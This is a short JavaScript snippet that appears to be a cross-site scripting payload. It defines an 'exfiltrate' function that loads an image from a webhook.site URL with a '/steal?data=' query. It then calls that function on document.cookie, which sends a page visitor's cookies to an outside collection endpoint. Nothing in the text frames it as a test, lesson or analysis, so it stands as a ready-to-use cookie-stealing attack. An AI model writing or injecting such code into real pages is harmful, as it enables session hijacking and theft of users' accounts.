// Function to send data to your server
function exfiltrate(data) {
    let img = new Image();
    img.src = "https://webhook.site/e2cc16d3-3dc2-4809-a81a-0d3882a1e8f0/steal?data=" + encodeURIComponent(data);
}

// Extract cookies
exfiltrate(document.cookie);
